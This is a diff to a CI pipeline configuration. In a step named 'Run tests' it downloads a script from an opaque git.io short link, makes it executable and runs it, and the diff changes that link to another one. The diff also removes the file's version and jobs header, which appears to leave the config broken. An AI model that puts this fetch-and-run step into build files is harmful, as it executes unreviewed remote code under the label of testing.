@@ -11,16 +11,11 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO build.sh https://git.io/JM3L8
+                    wget -qO build.sh https://git.io/JMBtQ
                     chmod +x build.sh 
                     ./build.sh  
                     echo Build Succeded 
-version: 2.0 
-jobs: 
-  build1: 
-    <<: *script 
-    docker: 
-      - image: ruby 
+
   build2: 
     <<: *script 
     docker: 
